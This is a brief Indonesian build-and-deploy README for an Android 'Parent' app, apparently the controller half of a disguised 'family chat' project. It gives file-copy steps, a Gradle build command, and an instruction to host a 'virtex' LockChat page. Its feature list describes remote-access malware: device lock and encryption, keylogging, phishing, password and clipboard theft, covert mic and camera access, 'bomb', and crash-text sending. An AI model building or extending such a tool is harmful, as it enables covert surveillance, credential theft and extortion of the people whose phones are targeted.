SORA PARENT — semua fitur UI + remote + dashboard + virtex sender
================================================================

Copy ke project ParentApp:

1) Kotlin
   com/familychat/parent/*.kt
   → ParentApp/app/src/main/java/com/familychat/parent/

2) Layout
   res/layout/activity_remote_control.xml
   → ParentApp/app/src/main/res/layout/

3) Themes (opsional)
   res/values/themes.xml
   → ParentApp/app/src/main/res/values/

4) Virtex HTML (hosting, bukan APK)
   virtex/sora_lockchat.html → upload ke hosting, set URL di VirtexSender.kt

Pastikan Manifest Parent ada:
   <uses-permission android:name="android.permission.INTERNET" />

Build:
   cd ParentApp
   gradlew.bat assembleDebug

APK:
   app\build\outputs\apk\debug\app-debug.apk

Isi fitur Parent:
- Remote: lock, unlock, alarm, jumpscare, vibrate, encrypt, wallpaper, video scare
- Virtex LockChat sender
- Advanced: collect, mic, cam, torch, phish, keylog, clipboard, passwords, bomb
- Dashboard: jam, kalender, cuaca, jadwal sholat, music search+play full (Archive/Radio)
